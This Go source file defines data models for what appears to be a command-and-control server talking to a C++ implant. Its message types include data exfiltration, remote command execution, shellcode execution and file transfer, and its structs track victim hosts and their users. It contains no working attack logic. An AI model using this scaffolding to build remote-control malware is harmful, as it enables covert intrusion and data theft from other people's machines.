package models

import (
	"net"
	"time"
)

// Message types matching your C++ enum exactly
const (
	MESSAGE_NONE               = 0
	MESSAGE_DEFAULT            = 1
	MESSAGE_HANDSHAKE          = 2
	MESSAGE_HEARTBEAT          = 3
	MESSAGE_SYS_INFO           = 4
	MESSAGE_COMMAND_RESULT     = 5
	MESSAGE_DATA_EXFIL         = 6
	MESSAGE_UPLOAD_FILE        = 7
	MESSAGE_EXECUTE_COMMAND    = 8
	MESSAGE_EXECUTE_SHELL_CODE = 9
	MESSAGE_DOWNLOAD_FILE      = 10
	MESSAGE_CONFIG_UPDATE      = 11
	MESSAGE_ERROR_REPORT       = 12
)

// MessageHeader matches your C++ #pragma pack(1) struct
type MessageHeader struct {
	MessageType uint32
	DataSize    uint32
	MessageID   uint32
}

// InternalMessage matches your C++ struct
type InternalMessage struct {
	Header MessageHeader
	Data   []byte
}

type ClientMessage struct {
	Timestamp time.Time `json:"timestamp"`
	Type      string    `json:"type"`
	MessageID uint32    `json:"message_id"`
	Content   string    `json:"content"`
	DataSize  int       `json:"data_size"`
}

type Client struct {
	ID         string
	Conn       net.Conn
	LastSeen   time.Time
	SystemInfo SystemInfo
	IPAddress  string
	IsActive   bool
	Messages   []ClientMessage // Store messages for this client
}

type SystemInfo struct {
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	User     string `json:"user"`
}

type CommandRequest struct {
	Client  string `json:"client"`
	Command string `json:"command"`
}

type ConfigRequest struct {
	Client string `json:"client"`
	Config string `json:"config"`
}
